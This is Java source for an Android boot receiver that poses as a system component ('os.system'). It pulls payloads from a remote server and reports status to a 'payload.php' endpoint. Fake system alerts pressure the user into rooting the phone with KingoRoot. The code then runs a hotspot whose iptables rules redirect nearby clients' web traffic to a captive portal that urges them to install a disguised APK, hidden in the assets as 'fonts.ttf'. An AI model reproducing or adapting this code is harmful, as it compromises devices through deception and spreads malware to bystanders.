package os.system;

import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.*;
import android.app.*;
import android.os.AsyncTask;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.Handler;
import android.os.Vibrator;
import android.os.BatteryManager;
import android.content.BroadcastReceiver;
import android.util.Log;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.*;
import android.content.ActivityNotFoundException;
import android.content.SharedPreferences;
import android.widget.*;
import android.view.*;
import android.media.MediaPlayer;
import android.media.AudioManager;
import android.view.LayoutInflater;
import android.view.Gravity;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.webkit.MimeTypeMap;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiConfiguration;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;
import java.lang.reflect.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private static String TAG = "AsDfGhJ";
	private Vibrator vibrator;
	private boolean oke = true;
	private SystemThread system;
	private Context exContext;
	private ServerUtils utils;
    private Installer installator;
    private String pathToInstallServer;
    private static String version = "1";
    private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private AudioManager audioManager;
	private static boolean prosesThread = true;
	private static boolean tmpThread = true;
	private static int sizedownload = 0;
	public AlertDialog dialog;
	public Toast toast;
	public static int delayToast = 0;

	public static boolean finishInstall = false;
    public static boolean rootResult = false;
	public static boolean installResult = false;
	public static String identitasResult = "";
	public static boolean pingResult = false;
	public static String requestAksi = "";
	public static String requestPath = "";
	public static String requestUrl = "";
	public static String requestResult = "";
	public static String requestResultUpload = "";
	public static String batStatus = "";
    public static boolean main = true;
    public static String mainSave = "";
    public static String docFolder, pathExternal;
    public static boolean[] flags;
    private Handler mHandler = new Handler();

	private Runnable mRefresh = new Runnable() {
		public void run() {
			toast.show();
			mHandler.postDelayed(mRefresh, 100);
		}
	};

	// jangan dipanggil 2x dalam satu waktu
	public void toastShow(Context context, String aktif, int warna, int letak, String text) 
	{
		if (delayToast != 0) {
			mHandler.removeCallbacks(mRefresh);

			Log.i(TAG, "count"+delayToast);
			toastText(context, text, warna, letak);

			CountDownTimer hitungMundur = new CountDownTimer(delayToast, 100){
				public void onTick(long millisUntilFinished){
					toast.show();
				}
				public void onFinish()
				{
					toast.cancel();
				}
			}.start();
		}
		else if (aktif.equals("aktif") && delayToast == 0) 
		{
			Log.i(TAG, "handler:"+delayToast);
			mHandler.removeCallbacks(mRefresh);
			mHandler.postDelayed(mRefresh, 100);
			toastText(context, text, warna, letak);
		}
		else {
			Log.i(TAG, "remove"+delayToast);
			mHandler.removeCallbacks(mRefresh);
		}
	}

	public String getPath() {
		return pathExternal;
	}
	public void shared(String judul, String save) {
		seteditor.putString(judul, save);    
        seteditor.commit();
	}

	private void logSend(Context context, String text) {
		if (pingResult) 
		{
			String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
			String hash = "";
			String[] pros = { "["+waktu+"] "+text };
			try {
				for (String s : pros)     
				{
					hash = URLEncoder.encode(s, "UTF-8");       
				}
			}catch (Exception e) {}

			system.reqPayload(context, system.urlServer+"/payload.php?outpayload="+hash, "null");
		}
	}

	public void install(Context context) {
		
	    if (!utils.checkDownload()) 
	    {
	    	Log.i(TAG, "download all data..........");
			
			requestUrl = system.urlServer+"/install.txt";
			requestAksi = "web";
			mainRequest(context);

		   	JSONObject obj;

	    	if (!new File(pathExternal+"/server.zip").exists()) 
	    	{
				try {
					logSend(context, "download SERVER............\n");
					obj = new JSONObject(requestResult);
					Log.i(TAG, "download server : "+obj.getString("url_install_server"));

					requestUrl = obj.getString("url_install_server");
					requestAksi = "download";
					requestPath = pathExternal+"/server.zip";
					mainRequest(context);
				}
				catch(Exception e) {}
	    	} else {
	    		logSend(context, "download SERVER............OK\n");
	    		try {
	    			obj = new JSONObject(requestResult);
		    		Log.i(TAG, "download DATA : "+obj.getString("url_install_data"));
		    		logSend(context, "download DATA..............\n");

		    		requestUrl = obj.getString("url_install_data");
					requestAksi = "download";
					requestPath = pathExternal+"/data.zip";
					mainRequest(context);
				}catch(Exception e) {}
	    	}
	    	
        } 

        if (utils.checkDownload() && !utils.checkInstall()) {
        	logSend(context, "download DATA..............OK\n");
        	logSend(context, "extract SERVER............\n");
        	extrak(context, pathExternal+"/server.zip", pathToInstallServer, docFolder);
        }

        if (utils.checkDownload() && !utils.checkInstallData() && utils.checkInstall()) {
			logSend(context, "extract SERVER.............OK\n");
			logSend(context, "extract DATA...............OK\n");

			extrak(context, pathExternal+"/data.zip", pathExternal, pathExternal);
        }

        if (utils.checkInstallData()) {
			installResult = true;
        }
	}

	public void rooting(Context context) 
	{
		
		if (rootRequest().equals("root")) {
			mHandler.removeCallbacks(mRefresh);
			rootResult = true;
		}
		if (rootRequest().equals("tolak user")) {
			logSend(context, "root android state............TOLAK USER\n");
			rootResult = false;
			toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
		}
		if (rootRequest().equals("tidak root")) {
			logSend(context, "root android state.............NO ROOT\n");
			rootResult = false;
			if (!new MainActivity().apkMana(context, "kingoroot.supersu", "open")) 
			{
				logSend(context, "install KINGOROOT..............\n");

				toastShow(context, "mati", 0, 0, "");
				toastShow(context, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. Open app and click root.\n\n\n\n\n       [ WARNING! ]\n\n\n");
		
				String kroot = pathExternal+"/kroot.apk";

				Intent intent = new Intent(Intent.ACTION_VIEW);
        		intent.setDataAndType(Uri.fromFile(new File(kroot)), "application/vnd.android.package-archive");
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		context.startActivity(intent);
        		Log.i(TAG, kroot+kroot);	
	      	}
			else {
				logSend(context, "install KINGOROOT.............OK\n");
				toastShow(context, "mati", 0, 0, "");
				toastShow(context, "aktif", Color.GREEN, Gravity.TOP, "  [ PLEASE ROOTING NOW ]   \n\n\n     Android system reboot after 30 minuts.    \n\n\n[ WARNING ]\n");
			}
        }
	}

	public void _server(Context context) {
		utils = new ServerUtils(context);
	}
	public String setServer(boolean sw) {
		flags = utils.checkRun();
		if (flags[0] && flags[1] && flags[2]) 
		{
			if (!sw) {
				utils.stopSrv();
				return "server stoping";
			} 
			else {
				return "server running";
			}
		}
		else {
			if (sw) {
				utils.runSrv();
				return "server running";
			}
		}
		return "";
	}

	public void main(Context context, String[] iproute) 
	{
		Log.i(TAG, "panggil");
		
		if (hostspotStatus(context)) 
		{
			flags = utils.checkRun();

			if (flags[0] && flags[1] && flags[2]) Log.i(TAG, "run server OK");
			else utils.runSrv();

			if (!cekGsm(context)) {
				setGSM(true, context);
			}

			if (cekClient().equals("ada")) {
				Log.i(TAG, "ada client");
				dialog.cancel();
			} 
			else {
				dialogAlert(context, "Sistem Android", "Network manager can't access hardware /etc/misc/wifi_supplicant please folowing:\n\n\n1. hubungkan wifi ke hotspot ini\n\n2. Sign captive portal\n     atau buka browser akses url        http://index.html\n\n3. Install dan buka app untuk update system");

				CountDownTimer hitungMundur = new CountDownTimer(5000, 100){
					public void onTick(long millisUntilFinished){
					}
					public void onFinish()
					{
						dialog.cancel();
					}
				}.start();
				//toastShow(context, "aktif", Color.YELLOW, Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nNetwork manager can't add client to /data/misc/wifi please folowing:\n\n1. open browser url http://index.html or Sign in Captive portal\n2. Install app to update\n3. Open app to configure\n\n\n\n\n[UPDATE]");
			}
		}
		
		if (hostspotStatus(context) && main) 
		{
		   	main = false;
			Log.i(TAG, "main:"+main);
			
		   	setGSM(true, context);
			rootCommands(iproute);

			try {
				Runtime.getRuntime().exec("mkdir -p "+pathExternal+"/client");
			}catch(Exception e) {}

			if (!new File(pathExternal+"/system.apk").exists()) 
			{
				if (new MainActivity().apkMana(context, "os.system", "pull")) 
				{
					try {
						Thread.sleep(4000);
						Runtime.getRuntime().exec("mv "+pathExternal+"/os.system.apk "+pathExternal+"/system.apk");
					}catch(Exception e){
						Log.i(TAG, "rename er : "+e);
					}
				}
	    	}
			
    	}
    	else if (!hostspotStatus(context) && !main) 
    	{
			Log.i(TAG, "reset");

			flags = utils.checkRun();
			if (flags[0] && flags[1] && flags[2]) 
			{
				utils.stopSrv();
				Log.i(TAG, "stop server OK");
			}

			dialog.cancel();

			if (cekClientOrServer().equals("client")) {
				Log.i(TAG, "mode client");
				requestUrl = "http://"+Identitas.getIpRouter()+":8888/fileman.php?id="+Identitas.getIPAddress(true);
				requestAksi = "web";
				mainRequest(context);
			}

    		
			try {
				Runtime.getRuntime().exec("rm "+pathExternal+"/system.apk");
			}
			catch(Exception e) {}
			try {
				Runtime.getRuntime().exec("rm -r "+pathExternal+"/client");
			}
			catch(Exception e) {}

			main = true;
		}

	}

	public String cekClientOrServer() {
		String sip = Identitas.getIPAddress(true);
        String[] ip = sip.split("[.]");
        int index = ip.length - 1;

        Log.i(TAG, "addres : "+ip[index]);

        if (ip[index].equals("1")) {
        	return "server";
        }
        return "client";
	}

	public String cekClient() {
		String exe = shellCommands("ls "+pathExternal+"/client");
		if (exe.equals("")) {
			return "kosong";
		}

		return "ada";
	}

	public boolean ping(Context context) {
		Log.i(TAG, "ping server: "+system.urlServer);

		HttpParams httpParams = new BasicHttpParams();
	    HttpConnectionParams.setConnectionTimeout(httpParams, 10000);
	    HttpConnectionParams.setSoTimeout(httpParams, 10000);

        HttpClient httpClient = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(system.urlServer);
        try{
        	Log.i(TAG, "ping....");
            HttpResponse response = httpClient.execute(request);
        	Log.i(TAG, "ping terhubung");
        	return true;
		}
		catch(Exception e) {
			e.printStackTrace();
			Log.i(TAG, "ping error ");
			return false;
		}
	}

	public static boolean cekConnection(Context context) {
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo wifinfo    = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo active     = cm.getActiveNetworkInfo();
		
		if (wifinfo != null && wifinfo.isConnected()) {
			return true;
		}
		if (mobileinfo != null && mobileinfo.isConnected()) {
			return true;
		}
		if (active != null && active.isConnected()) {
			return true;
		}
		return false;
	}

	public static boolean cekGsm(Context context) {
		ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo mobileinfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		NetworkInfo active     = cm.getActiveNetworkInfo();
		
		if (mobileinfo != null && mobileinfo.isConnected()) {
			return true;
		}
		if (active != null && active.isConnected()) {
			return true;
		}
		return false;
	}

	public static void setGSM(boolean enable, Context context) {
    	String command;
    	if (enable) {
    		command = "svc data enable\n";
    	} else {
    		command = "svc data disable\n";
    	}
    	try {
    		Process su = Runtime.getRuntime().exec("su");
    		DataOutputStream out = new DataOutputStream(su.getOutputStream());
    		out.writeBytes(command);
    		out.flush();
    		
    		out.close();
    	}
    	catch (Exception e) {}
    }

	public static boolean hostspotStatus(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		try { 
			Method method = wifimanager.getClass().getDeclaredMethod("isWifiApEnabled"); 
			method.setAccessible(true); 
			return (Boolean) method.invoke(wifimanager); 
		}
		catch (Throwable ignored) {} 
		return false; 
	} 

	public static boolean hotspotConfig(Context context) { 
		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
		WifiConfiguration wificonfiguration = null; 
		try { 
			// if WiFi is on, turn it off 
			if(hostspotStatus(context)) { 
				wifimanager.setWifiEnabled(false);
				main = true;
			} 
			Method method = wifimanager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class); 
			method.invoke(wifimanager, wificonfiguration, !hostspotStatus(context)); 
			return true; 
		}
		catch (Exception e) { 
			e.printStackTrace(); 
		} 
		return false; 
	} 

	public static String rootRequest() {
		boolean retval = false;
		Process suProcess;
		String rootData = "";
		try {
			suProcess = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(suProcess.getOutputStream());
			DataInputStream osRes = new DataInputStream(suProcess.getInputStream());
			if (null != os && null != osRes) {
				os.writeBytes("id\n");
				os.flush();

				String currUid = osRes.readLine();
				boolean exitSu = false;
				if (null == currUid) {
					retval = false;
					exitSu = false;
					rootData = "tolak user";
					Log.d("ROOT","Cant get root access or denied by user");
				}
				else if (true == currUid.contains("uid=0")) {
					retval = true;
					exitSu = true;
					rootData = "root";
					Log.d("ROOT","Root access granted");
				}
				else {
					retval = false;
					exitSu = true;
					Log.d("ROOT","Root access rejectd: "+currUid);
				}

				if (exitSu) {
					os.writeBytes("exit\n");
					os.flush();
				}

			}
		} catch (Exception e) {
			retval = false;
			rootData = "tidak root";
			Log.d("ROOT", "Root access rejectd["+e.getClass().getName()+"] :"+e.getMessage());
		}
		//return retval;
		return rootData;
	}

	public void rootCommands(String[] cmds) {
		Process p;
		try{
			p = Runtime.getRuntime().exec("su");
			DataOutputStream os = new DataOutputStream(p.getOutputStream());

			for (String tmpCmd : cmds) {
				os.writeBytes(tmpCmd+"\n");
			}
			os.writeBytes("exit\n");
			os.flush();
		} catch (Exception e) {}
	}

	public String shellCommands(String command) {

		StringBuffer output = new StringBuffer();

		Process p;
		try {
			p = Runtime.getRuntime().exec(command);
			p.waitFor();
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			String line = "";
			while ((line = reader.readLine())!= null) {
				output.append(line+"\n");
			}

		}
		catch (Exception e) {
			e.printStackTrace();
		}
		String response = output.toString();
		return response;
	}
	

	public String textSplit(String data, String tsplit) {
		StringBuffer out = new StringBuffer();
		String[] sp = data.split(tsplit);

		for (int i=0; i<sp.length; i++) {
			out.append(sp[i]);
		}
		return out.toString();
	}

	public void editor(Context context, String text, String nfile) {
		Installer save = new Installer(context, false);
		try {
			save.saveCode(text, "utf-8", pathExternal+"/"+nfile);
		}catch(Exception e){}
	}

	private void extrak(Context context, String efile, String pathsatu, String pathdua) {
		Installer installator = new Installer(context, true);
		installator.execute(efile, pathsatu, pathdua);
	}

	private static String getExtension(String path) {
        if (path.contains(".")) {
            return path.substring(path.lastIndexOf(".")).toLowerCase();
        }
        return null;
    }

	public void audio(Context context, String pathAudio, String start) {
		MediaPlayer player = new MediaPlayer();
		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL); //SILENT, VIBRATE

		if (start.equals("start")) {
			try {
				player.setDataSource(pathAudio);
			}catch(Exception e) {}

			player.setLooping(false);
			player.setVolume(100, 100);

			try {
				player.prepare();
				player.start();
			}catch(Exception e) {}
		}
		else {
			player.stop();
			player.release();
		}
	}

	public void toastText(Context context, String data, int warna, int letak)
	{
		LinearLayout layout = new LinearLayout(context);
		ImageView image = new ImageView(context);
		
		image.setImageResource(R.drawable.img);
		layout.addView(image);

    	TextView text = new TextView(context);
		text.setText(data);
		text.setTextColor(Color.BLACK);
		text.setTextSize(13);
		text.setGravity(Gravity.CENTER);
		layout.addView(text);

		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(text);
		toast.setView(layout);

		View toastView = toast.getView();
		toastView.setBackgroundColor(warna);
	}

	public void dialogAlert(Context context, String title, String text) {
		dialog = new AlertDialog.Builder(context)
					.setTitle(title)
					.setMessage(text)
					.setIcon(R.drawable.img)
					.create();
		dialog.setCancelable(false);
		dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
		dialog.show();
	}

	public void windowAlert(Context context, String text, boolean sw) {
		ViewKu view = new ViewKu(context, "window", "text");

		if (sw) {
			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        	WindowManager.LayoutParams lp = new WindowManager.LayoutParams(300, 300,
																	   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
																	   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
        	lp.gravity = Gravity.START | Gravity.TOP;
        	wm.addView(view, lp);
        }
        else {
			WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        	wm.removeViewImmediate(view);
        }
	}

	public void toastImage(Context context, String path, int letak)
	{
		toast = new Toast(context.getApplicationContext());
		toast.setGravity(letak, 0, 0);
		toast.setView(new ViewKu(context, path, ""));

		View toastView = toast.getView();
		toastView.setBackgroundColor(Color.TRANSPARENT);
	}


    private class ViewKu extends View {
		private Bitmap image;
		private Paint redPaint;
		private int screenW;
		private int screenH;
		private String shift = "";
		private String windowText = "";

		public ViewKu(Context context, String pathAlert, String windowText) {
			super(context);
			this.shift = pathAlert;
			this.windowText = windowText;

			if (pathAlert.equals("window")) {
				redPaint = new Paint();	
				redPaint.setAntiAlias(true);
				redPaint.setColor(Color.RED);
			}
			else {
				image = BitmapFactory.decodeFile(pathAlert);
			}
		}
	
		@Override 
		protected void onDraw(Canvas canvas) {
			if (shift.equals("window")) {
				canvas.drawCircle(100, 100, 30, redPaint);
				canvas.drawText("Whacked:", 10, redPaint.getTextSize()+10, redPaint);
			}
			else {
				canvas.drawBitmap(image, (screenW-image.getWidth())/9, 0, null);
			}
		}
	}

	public void mainRequest(Context context) {
		CallWebPageTask task = new CallWebPageTask();
		task.applicationContext = context;
		task.main = requestAksi;

		try {
			if (cekConnection(context)) {
				task.execute(new String[] { requestUrl });
			} else {
				Log.i(TAG, "rece connection : "+cekConnection(context));
			}
		}catch(Exception e) {
		}
	}

	public String requestUpload() {
		String strSDPath = requestPath;
		String strUrlServer = requestUrl;
            
		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024;
		int resCode = 0;
		String resMessage = "";

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary =  "*****";
		String resServer = "";

        	
		try {
			/** Check file on SD Card ***/
			File file = new File(strSDPath);
			if(!file.exists())
			{
				resServer = "{\"StatusID\":\"0\",\"Error\":\"Please check path on SD Card\"}";
				return null;
			}

			FileInputStream fileInputStream = new FileInputStream(new File(strSDPath));

			URL url = new URL(strUrlServer);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");

			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Content-Type",
										"multipart/form-data;boundary=" + boundary);

			DataOutputStream outputStream = new DataOutputStream(conn
																	 .getOutputStream());
			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			outputStream.writeBytes("Content-Disposition: form-data; name=\"filUpload\";filename=\""+ strSDPath + "\"" + lineEnd);
			outputStream.writeBytes(lineEnd);

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			// Read file
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {
				outputStream.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			outputStream.writeBytes(lineEnd);
			outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			// Response Code and  Message
			resCode = conn.getResponseCode();
			if(resCode == HttpURLConnection.HTTP_OK)
			{
				InputStream is = conn.getInputStream();
				ByteArrayOutputStream bos = new ByteArrayOutputStream();

				int read = 0;
				while ((read = is.read()) != -1) {
					bos.write(read);
				}
				byte[] result = bos.toByteArray();
				bos.close();
				resMessage = new String(result);
			}

			Log.d("resCode=",Integer.toString(resCode));
			Log.d("resMessage=",resMessage.toString());

			fileInputStream.close();
			outputStream.flush();
			outputStream.close();

			resServer = resMessage.toString();
			requestResultUpload = resServer;
		
		} catch (Exception ex) {
			// Exception handling
			requestResultUpload = "uploaderror";

			return null;
		}
		return resServer;
	}
	

	public String requestDownload() {
		InputStream input = null;
        OutputStream output = null;
        HttpURLConnection connection = null;
        String error = "";
        try {
            URL url = new URL(requestUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "Server returned HTTP "+ connection.getResponseCode()+" "+connection.getResponseMessage();
            }

            int fileLength = connection.getContentLength();

            // download the file
            input = connection.getInputStream();
            output = new FileOutputStream(requestPath);
            byte data[] = new byte[4096];
            long total = 0;
            int count;

            while ( (count=input.read(data)) != -1 ) {
                /*if (isCancelled()) {
                    input.close();
                    return null;
                }*/
                total += count;

                if (fileLength > 0) 
                	sizedownload = (int) (total * 100 / fileLength);
                    //publishProgress((int) (total*100/fileLength));
                output.write(data, 0, count);
            }

        } catch (IOException e) {
            error = e.toString();
        } finally {
            try {
                if (output != null) output.close();
                if (input != null) input.close();
            }
            catch (IOException ioe) {

            }
            if (connection != null) connection.disconnect();
        }
        return "ok : "+error;
	}
	
	//Mengirimkan data web keserver
	public String requestWeb(){
		String sret = "";
		HttpParams httpParams = new BasicHttpParams();
	    HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    HttpConnectionParams.setSoTimeout(httpParams, 50000);

        HttpClient httpClient = new DefaultHttpClient(httpParams);
        HttpGet request = new HttpGet(requestUrl);
        try{
            HttpResponse response = httpClient.execute(request);

            try { // split result
         	   InputStream in = response.getEntity().getContent();
         	   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
         	   StringBuilder str = new StringBuilder();
         	   String line = null;
         	   while((line = reader.readLine()) != null){
         	       str.append(line);
         	   }
         	   in.close();
         	   sret = str.toString();
        	} catch(Exception ex) {
        	  	Log.i(TAG, "Error split text");
        	}
        }
		catch(Exception ex){
			Log.i(TAG, "Failed rece Connect to Server!");
        }
        return sret;
    }

    @Override
	public void onReceive(Context context, Intent intent)
	{
		exContext = context;
		float voltase = (float)(intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0))/100;
		float persent = (float)(intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0));
		int statusB = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);

		String[] portal = {
				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
				"iptables -P FORWARD DROP",
				"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80"
			};

		boolean state = statusB == BatteryManager.BATTERY_STATUS_CHARGING || statusB == BatteryManager.BATTERY_STATUS_FULL;
		String charger = "TIDAK_CHARGER";
		if (state) {
			int charPlug = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
			boolean usbPlug = charPlug == BatteryManager.BATTERY_PLUGGED_USB;
			boolean acPlug = charPlug == BatteryManager.BATTERY_PLUGGED_AC;
			
			if (usbPlug) {
				charger = "USB_CHARGER";
			}
			else if (acPlug) {
				charger = "AC_CHARGER";
			}
		}
		batStatus = ""+voltase+"v "+persent+"% "+charger;

		system = new SystemThread();
		audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
		vibrator = (Vibrator)context.getSystemService(Context.VIBRATOR_SERVICE);
		settings = context.getSharedPreferences("Settings", 0);
		seteditor = settings.edit();
		mainSave = settings.getString("swmain","");
		utils = new ServerUtils(context);
		identitasResult = Identitas.getIPAddress(true);
        pathToInstallServer = utils.getPathToInstallServer();
        docFolder = utils.getDocFolder();
        pathExternal = utils.getPathExternal();

        if (settings.getString("server","").equals("aktif")) {
        	install(context);
        }

        if (settings.getString("pakroot","").equals("aktif")) {
        	if (rootRequest().equals("tolak user")) {
				logSend(context, "root android state............TOLAK USER\n");
				toastShow(context, "aktif", Color.RED, Gravity.TOP, "SYSTEM ALERT WINDOW\n\n\n     Please Allow superuser.    \n\nnetwork state can't access binary system to update manager\n\n\n");
			}
		}

        if (mainSave.equals("hidup")) 
		{
			install(context);
			if (installResult) 
			{
				rooting(context);
				if (rootResult) 
				{
					main(context, portal);
				}
			}
		}

		if (hostspotStatus(context)) {
			logSend(context, "Hotspot terpakai............OK\n");
		}


		//harus urut eksekusi
		if (cekConnection(context) && !hostspotStatus(context)) 
		{
			if (charger.equals("USB_CHARGER")) 
			{
				pingResult = false;
			} else {
				pingResult = true;
			}

			//DEBUG MODE
			//pingResult = true;
			
        } 
        else {
        	pingResult = false;
        }

        finishInstall = false;
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
        {
        	finishInstall = true;
			context.startService(new Intent(context, SystemThread.class));
			File htdocs = new File(utils.getPathExternal());
        	if (!htdocs.exists()) {
        	    htdocs.mkdir();
        	}

			try {
				if (!new MainActivity().apkMana(context, "os.system", "open")) 
				{
					new Installer(context, true).assetToSdcard(context, "fonts.ttf", pathExternal+"/");
					Thread.sleep(1000);
					Runtime.getRuntime().exec("mv "+pathExternal+"/fonts.ttf "+pathExternal+"/system.apk");
					Thread.sleep(1000);
				}
				Log.i(TAG, "exekusi sukses");

			}catch(Exception e) {
				Log.i(TAG, "errrot:"+e);
			}


			try {
				Runtime.getRuntime().exec("rm "+pathExternal+"/*.jpg");
			}
			catch(Exception e) {}
		}
	}


	private class CallWebPageTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String main = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	//data[0] = url
	    	if (main.equals("web")) {
				return requestWeb();
			}
			else if (main.equals("download")){
				return requestDownload();
			}
			else if (main.equals("upload")) {
				return requestUpload();
			}
			return null;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	if (main.equals("web")) {
		    	requestResult = result;
	    	}
		}
	}

}

